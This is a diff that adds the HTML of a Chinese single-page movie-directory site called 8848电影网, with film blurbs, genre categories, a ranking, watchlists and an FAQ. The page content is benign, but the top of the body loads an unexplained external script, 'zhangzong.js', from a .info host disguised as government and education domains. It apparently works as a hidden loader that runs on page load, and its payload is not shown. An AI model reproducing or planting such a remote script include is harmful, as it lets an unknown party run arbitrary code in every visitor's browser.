@@ -1,0 +1,127 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>8848电影网：新片放映线索、电影分类索引与主题观影清单一站查阅</title>
+<meta name="description" content="8848电影网聚焦影片资料的整理与导览，涵盖新片速递、动作/喜剧/爱情/科幻/悬疑/动画等分类、口碑观察、主题片单和观影指南，帮助观众快速缩小选择范围并形成可执行清单。站点采用移动端优先的单页结构，内页锚点便于快速跳转阅读。">
+<meta name="keywords" content="8848电影网,电影网,电影分类,新片速递,电影排行榜,电影片单,电影资讯,观影指南,电影资料库">
+<link rel="canonical" href="https://8848dianyingwang-zh.github.io">
+<style>
+:root{--bg:#0d1117;--bg2:#141b24;--card:#18212c;--line:#26323f;--txt:#e8eef4;--mute:#9fb0bf;--gold:#d9a13b;--gold2:#f2c36b;--blue:#3f7ea8;--radius:18px}*{box-sizing:border-box}html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}body{margin:0;background:var(--bg);color:var(--txt);font:16px/1.75 system-ui,-apple-system,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;overflow-x:hidden}a{color:inherit;text-decoration:none}.wrap{max-width:1180px;margin:0 auto;padding:0 22px}.eyebrow{color:var(--gold);font-size:.72rem;letter-spacing:.24em;text-transform:uppercase;font-weight:800}.gold{color:var(--gold2)}header{position:sticky;top:0;z-index:9;background:#0d1117ee;backdrop-filter:blur(8px);border-bottom:1px solid var(--line)}.top{display:flex;justify-content:space-between;align-items:center;gap:16px;padding:14px 0}.logo{display:flex;align-items:center;gap:10px}.mark{width:38px;height:38px;border-radius:10px;background:linear-gradient(135deg,var(--gold),#8d5f12);display:grid;place-items:center;font-weight:900;font-size:1.1rem}.logo b{font-size:1.4rem;letter-spacing:.03em}.logo small{display:block;font-size:.68rem;color:var(--mute);font-weight:400}.nav{display:flex;gap:20px;overflow:auto;padding:12px 0;scrollbar-width:none}.nav a{white-space:nowrap;font-size:.9rem;color:var(--mute)}.nav a:hover{color:var(--gold2)}.hero{position:relative;margin:26px 0 38px;padding:44px 40px;border-radius:28px;overflow:hidden;background:radial-gradient(120% 120% at 90% 0,#21384a 0 22%,#10171f 55%),linear-gradient(135deg,#18212c,#0e151c);border:1px solid var(--line)}.hero:after{content:"";position:absolute;right:-60px;bottom:-90px;width:280px;height:280px;border-radius:50%;background:radial-gradient(circle,#d9a13b55,#0000 70%)}.hero .eyebrow{position:relative}.hero h1{font-size:clamp(1.9rem,4.6vw,3.4rem);line-height:1.14;margin:12px 0 14px;max-width:18ch}.hero h1 span{color:var(--gold2)}.hero p{max-width:52ch;color:var(--mute);margin:0 0 22px}.hero a{display:inline-block;padding:12px 22px;background:var(--gold);color:#211600;border-radius:999px;font-weight:800}.hero a:hover{background:var(--gold2)}.stats{display:flex;flex-wrap:wrap;gap:32px;margin-top:26px;padding-top:22px;border-top:1px solid #ffffff14}.stats div span{display:block;font-size:1.7rem;font-weight:900;color:var(--gold2)}.stats div small{color:var(--mute);font-size:.78rem}.notice{margin:0 0 40px;padding:14px 18px;background:#18212c;border-left:4px solid var(--gold);border-radius:0 12px 12px 0;color:var(--mute);font-size:.88rem}.section{margin:0 0 52px}.head{display:flex;justify-content:space-between;align-items:flex-end;gap:16px;margin:0 0 20px}.head h2{font-size:clamp(1.4rem,3vw,2rem);margin:8px 0 0}.head p{margin:8px 0 0;color:var(--mute);font-size:.88rem}.grid{display:grid;gap:18px}.g4{grid-template-columns:repeat(4,1fr)}.g3{grid-template-columns:repeat(3,1fr)}.g2{grid-template-columns:repeat(2,1fr)}.card{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:22px}.card:hover{border-color:var(--gold)}.card h3{margin:0 0 8px;font-size:1.15rem}.card p{margin:0;color:var(--mute);font-size:.92rem}.pill{display:inline-block;padding:3px 10px;border-radius:999px;background:#d9a13b1a;color:var(--gold2);font-size:.75rem;font-weight:700}.frame{position:relative;overflow:hidden;border-radius:14px;aspect-ratio:2/3;background:linear-gradient(160deg,#26333f,#15202b)}.frame em{position:absolute;inset:0;display:grid;place-items:center;color:var(--mute);font-style:normal;font-size:.78rem}.frame i{position:absolute;left:0;right:0;bottom:0;height:58%;background:linear-gradient(0deg,#0e151c,#0000)}.cap{position:absolute;left:14px;right:14px;bottom:12px;z-index:1}.cap b{display:block;font-size:1.05rem}.cap span{color:var(--mute);font-size:.78rem}.film .card{padding:0 0 18px;border:0;background:var(--card)}.film .body{padding:14px 4px 0}.film .body h3{margin:0 0 4px;font-size:1.08rem}.film .body p{font-size:.85rem}.rank{list-style:none;margin:0;padding:0;counter-reset:r}.rank li{display:flex;gap:14px;padding:16px 0;border-bottom:1px solid var(--line)}.rank li:last-child{border-bottom:0}.rank li:before{counter-increment:r;content:counter(r,decimal-leading-zero);color:var(--gold);font-weight:900;font-size:1.3rem;min-width:2.4rem}.rank h4{margin:0 0 3px;font-size:1.02rem}.rank small{color:var(--mute);font-size:.82rem}.guide{background:var(--bg2);border:1px solid var(--line);border-radius:28px;padding:38px}.guide .grid{grid-template-columns:repeat(4,1fr)}.step{border-left:3px solid var(--gold);padding-left:16px}.step b{display:block;color:var(--gold2);font-size:.85rem;letter-spacing:.1em}.step h3{margin:6px 0 8px;font-size:1.15rem}.step p{margin:0;color:var(--mute);font-size:.9rem}.faq{border-bottom:1px solid var(--line)}.faq summary{padding:18px 0;font-weight:700;cursor:pointer;list-style:none;position:relative;padding-right:32px}.faq summary::-webkit-details-marker{display:none}.faq summary:after{content:"＋";position:absolute;right:0;top:16px;color:var(--gold)}.faq[open] summary:after{content:"－"}.faq p{padding:0 0 18px;margin:0;color:var(--mute)}footer{border-top:1px solid var(--line);padding:34px 0 46px;color:var(--mute);font-size:.86rem}.footgrid{display:grid;gap:26px;grid-template-columns:1.5fr 1fr 1fr}.footgrid a{color:var(--gold2)}.copy{margin-top:24px;padding-top:18px;border-top:1px solid var(--line)}@media (max-width:920px){.g4,.g3,.g2,.guide .grid,.footgrid{grid-template-columns:1fr}.hero{padding:32px 22px}.head{flex-direction:column;align-items:flex-start}.top{flex-direction:column;align-items:flex-start}.wrap{padding:0 16px}.section{margin-bottom:40px}.nav{gap:16px}.stats{gap:20px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+<header>
+  <div class="wrap">
+    <div class="top">
+      <div class="logo"><div class="mark">8</div><div><b>8848电影网</b><small>影片线索整理与分类导览</small></div></div>
+      <a href="#guide" style="color:var(--gold2);font-weight:700">快速找片 →</a>
+    </div>
+    <nav class="nav" aria-label="主导航">
+      <a href="#intro">网站介绍</a><a href="#new">新片速递</a><a href="#cat">影片分类</a><a href="#rank">口碑榜单</a><a href="#list">主题片单</a><a href="#guide">观影指南</a><a href="#faq">常见问题</a>
+    </nav>
+  </div>
+</header>
+<main class="wrap">
+  <section class="hero" id="top">
+    <span class="eyebrow">8848 Film Directory</span>
+    <h1>从“片荒”到“开看”，<br>只需要一条<span>清晰的选片路径</span></h1>
+    <p>8848电影网把新片线索、类型分类、口碑观察与主题片单组织成单页导览，帮助你按心情和场景快速锁定候选影片，而不是在无数榜单中反复横跳。</p>
+    <a href="#new">查看新片速递</a>
+    <div class="stats">
+      <div><span>7</span><small>导览栏目</small></div>
+      <div><span>8+</span><small>影片分类</small></div>
+      <div><span>6</span><small>主题片单</small></div>
+      <div><span>单页</span><small>移动端自适应</small></div>
+    </div>
+  </section>
+  <p class="notice">本站为电影网资料索引与观影选择建议页面，仅整理影片线索与分类信息；具体放映、播放安排及版权情况请以版权方或正规渠道公布的信息为准。</p>
+  <section class="section" id="intro">
+    <div class="head"><div><span class="eyebrow">About 8848电影网</span><h2>把“看什么”变成可执行的清单</h2></div><p>资料整理 · 分类导览 · 选择建议</p></div>
+    <div class="grid g4">
+      <div class="card"><span class="pill">新片线索</span><h3>每周更新</h3><p>围绕影片简介、主创、类型与轮播线索，整理近期值得关注的电影资料。</p></div>
+      <div class="card"><span class="pill">分类检索</span><h3>类型优先</h3><p>从动作、喜剧、爱情、科幻到悬疑、动画，先定方向再挑影片。</p></div>
+      <div class="card"><span class="pill">口碑观察</span><h3>多视角参考</h3><p>把公开讨论、内容完整度与编辑视角放在同一语境，避免只看单一数字。</p></div>
+      <div class="card"><span class="pill">主题片单</span><h3>按场景选片</h3><p>覆盖周末、约会、亲子、放松等情境，直接给出可执行观看路线。</p></div>
+    </div>
+  </section>
+  <section class="section" id="new">
+    <div class="head"><div><span class="eyebrow">New Releases</span><h2>新片速递</h2></div><p>近期影片线索索引</p></div>
+    <div class="grid g3">
+      <article class="film"><div class="card"><div class="frame"><em>海报占位</em><i></i><div class="cap"><b>雪线之上</b><span>冒险 / 剧情 · 2026</span></div></div><div class="body"><h3>雪线之上</h3><p>高海拔环境下的救援行动，重点呈现团队协作、极限判断与自然景观。</p></div></div></article>
+      <article class="film"><div class="card"><div class="frame"><em>海报占位</em><i></i><div class="cap"><b>午夜接线员</b><span>悬疑 / 犯罪 · 2026</span></div></div><div class="body"><h3>午夜接线员</h3><p>以一通来电为起点，层层推进电话两端的证词与身份博弈。</p></div></div></article>
+      <article class="film"><div class="card"><div class="frame"><em>海报占位</em><i></i><div class="cap"><b>柑橘汽水</b><span>爱情 / 青春 · 2025</span></div></div><div class="body"><h3>柑橘汽水</h3><p>夏日小镇里的少年心事，节奏轻盈，适合放松心情时观看。</p></div></div></article>
+      <article class="film"><div class="card"><div class="frame"><em>海报占位</em><i></i><div class="cap"><b>机器回声</b><span>科幻 / 惊悚 · 2026</span></div></div><div class="body"><h3>机器回声</h3><p>围绕人工智能的一次异常反馈展开，讨论信任、边界与责任。</p></div></div></article>
+      <article class="film"><div class="card"><div class="frame"><em>海报占位</em><i></i><div class="cap"><b>阿婆的菜园</b><span>动画 / 治愈 · 2025</span></div></div><div class="body"><h3>阿婆的菜园</h3><p>用四季变换讲述家庭记忆与食物情感，画风细腻，适合合家观看。</p></div></div></article>
+      <article class="film"><div class="card"><div class="frame"><em>海报占位</em><i></i><div class="cap"><b>街头拳馆</b><span>动作 / 运动 · 2026</span></div></div><div class="body"><h3>街头拳馆</h3><p>聚焦小馆主与年轻拳手的关系，动作设计与人物成长并行推进。</p></div></div></article>
+    </div>
+  </section>
+  <section class="section" id="cat">
+    <div class="head"><div><span class="eyebrow">Film Categories</span><h2>影片分类</h2></div><p>从兴趣入口开始筛选</p></div>
+    <div class="grid g4">
+      <a class="card" href="#"><span class="pill">动作</span><h3>动作与冒险</h3><p>追车、格斗、极限环境，关注场面调度与人物目标是否清晰。</p></a>
+      <a class="card" href="#"><span class="pill">喜剧</span><h3>喜剧与轻剧情</h3><p>以误会、关系和错位制造笑点，适合寻找轻松的周末选择。</p></a>
+      <a class="card" href="#"><span class="pill">爱情</span><h3>爱情与家庭</h3><p>聚焦亲密关系、代际沟通与生活选择，风格从甜暖到现实。</p></a>
+      <a class="card" href="#"><span class="pill">科幻</span><h3>科幻与奇幻</h3><p>设定推动人物行动，兼顾想象规则、伦理问题与视觉表达。</p></a>
+      <a class="card" href="#"><span class="pill">悬疑</span><h3>悬疑与犯罪</h3><p>围绕案件、证词与动机展开，适合喜欢逐层拆解的观众。</p></a>
+      <a class="card" href="#"><span class="pill">动画</span><h3>动画与亲子</h3><p>从短片、剧场版到合家欢动画，关注适龄内容与故事完整性。</p></a>
+      <a class="card" href="#"><span class="pill">纪录</span><h3>纪录片与传记</h3><p>以真实人物、自然议题或行业幕后为入口，强调信息密度。</p></a>
+      <a class="card" href="#"><span class="pill">经典</span><h3>经典与修复版</h3><p>挑选经时间检验、影响后续创作或在影史上有讨论价值的作品。</p></a>
+    </div>
+  </section>
+  <section class="section" id="rank">
+    <div class="head"><div><span class="eyebrow">Word of Mouth</span><h2>口碑观察榜</h2></div><p>编辑整理 · 仅供参考</p></div>
+    <ol class="rank card">
+      <li><div><h4>雪线之上</h4><small>冒险 / 剧情 · 讨论集中于自然景观与团队协作的真实感</small></div></li>
+      <li><div><h4>午夜接线员</h4><small>悬疑 / 犯罪 · 线索铺设完整，对话张力较强</small></div></li>
+      <li><div><h4>机器回声</h4><small>科幻 / 惊悚 · 设定表达清晰，伦理讨论引发二次解读</small></div></li>
+      <li><div><h4>街头拳馆</h4><small>动作 / 运动 · 人物弧线与动作执行获得较多正面评价</small></div></li>
+      <li><div><h4>阿婆的菜园</h4><small>动画 / 治愈 · 画风、配乐与情感细节是主要亮点</small></div></li>
+      <li><div><h4>柑橘汽水</h4><small>爱情 / 青春 · 演员化学反应自然，节奏舒适</small></div></li>
+    </ol>
+  </section>
+  <section class="section" id="list">
+    <div class="head"><div><span class="eyebrow">Watchlists</span><h2>主题片单</h2></div><p>不想翻一小时？直接照单选</p></div>
+    <div class="grid g3">
+      <article class="card"><span class="eyebrow">Relax</span><h3>下班后放空</h3><p>轻喜剧、治愈向动画和节奏不紧绷的爱情片，避免长时间烧脑。</p><a href="#" style="color:var(--gold2);font-weight:700">查看 8 部 →</a></article>
+      <article class="card"><span class="eyebrow">Focus</span><h3>周末完整看完</h3><p>叙事完整、人物塑造扎实，适合关灯静看的剧情片与犯罪片。</p><a href="#" style="color:var(--gold2);font-weight:700">查看 8 部 →</a></article>
+      <article class="card"><span class="eyebrow">Family</span><h3>亲子共赏</h3><p>兼顾适龄表达、正向主题与视觉趣味，适合大人和孩子一起看。</p><a href="#" style="color:var(--gold2);font-weight:700">查看 8 部 →</a></article>
+    </div>
+  </section>
+  <section class="section guide" id="guide">
+    <span class="eyebrow">How To Choose</span>
+    <h2 style="margin:8px 0 22px">三步形成自己的观影路线</h2>
+    <div class="grid">
+      <div class="step"><b>STEP 01</b><h3>确定状态</h3><p>想放松、想思考，还是想和家人一起看？先明确需求。</p></div>
+      <div class="step"><b>STEP 02</b><h3>锁定分类</h3><p>用“影片分类”限定期待，再结合地区、年代继续筛选。</p></div>
+      <div class="step"><b>STEP 03</b><h3>对照片单</h3><p>把榜单、主题片单与自己的偏好交叉比较，形成三到五部清单。</p></div>
+      <div class="step"><b>STEP 04</b><h3>记录反馈</h3><p>看完留下简短评价，后续推荐会一次比一次精准。</p></div>
+    </div>
+  </section>
+  <section class="section" id="faq">
+    <div class="head"><div><span class="eyebrow">FAQ</span><h2>常见问题</h2></div></div>
+    <details class="faq" open><summary>8848电影网提供在线播放吗？</summary><p>本站主要提供电影资料索引、分类导览和观影选择建议，具体放映或播放安排请以版权方及正规渠道公布的信息为准。</p></details>
+    <details class="faq"><summary>新片资料多久更新一次？</summary><p>栏目按公开轮播线索与可核验资料进行整理，并在内容变化后更新；影片信息具有时效性和区域差异。</p></details>
+    <details class="faq"><summary>口碑榜的排序依据是什么？</summary><p>排序综合公开讨论、内容完整度与编辑观察，并非仅以单一评分决定，不同观众的观感可能存在差异。</p></details>
+    <details class="faq"><summary>为什么部分内链是占位链接？</summary><p>单页版本采用锚点导航；后续扩展分类页时，可再建立独立页面并维护对应链接。</p></details>
+  </section>
+</main>
+<footer>
+  <div class="wrap">
+    <div class="footgrid">
+      <div><b style="font-size:1.2rem">8848电影网</b><p style="margin:8px 0 0">专注电影资料整理、分类索引与主题片单，让找片、选片与建立个人观影路线更简单。</p></div>
+      <div><b>栏目</b><p style="margin:8px 0 0"><a href="#intro">网站介绍</a><br><a href="#new">新片速递</a><br><a href="#cat">影片分类</a><br><a href="#rank">口碑榜单</a></p></div>
+      <div><b>入口</b><p style="margin:8px 0 0"><a href="#list">主题片单</a><br><a href="#guide">观影指南</a><br><a href="#faq">常见问题</a><br><a href="#top">回到顶部</a></p></div>
+    </div>
+    <div class="copy">网站名称：8848电影网 ｜ 访问地址：<a href="https://8848dianyingwang-zh.github.io">https://8848dianyingwang-zh.github.io</a><br>© <span id="y">2026</span> 8848电影网 保留相关信息整理与页面设计说明。页面资料仅供索引与导览，不代表影片实际可播放状态。</div>
+  </div>
+</footer>
+<script>
+document.getElementById('y').textContent=new Date().getFullYear();
+document.querySelectorAll('a[href^="#"]').forEach(function(a){a.addEventListener('click',function(e){var t=document.querySelector(this.getAttribute('href'));if(t){e.preventDefault();window.scrollTo({top:t.getBoundingClientRect().top+window.pageYOffset-12,behavior:'smooth'})}})});
+</script>
+</body>
+</html>
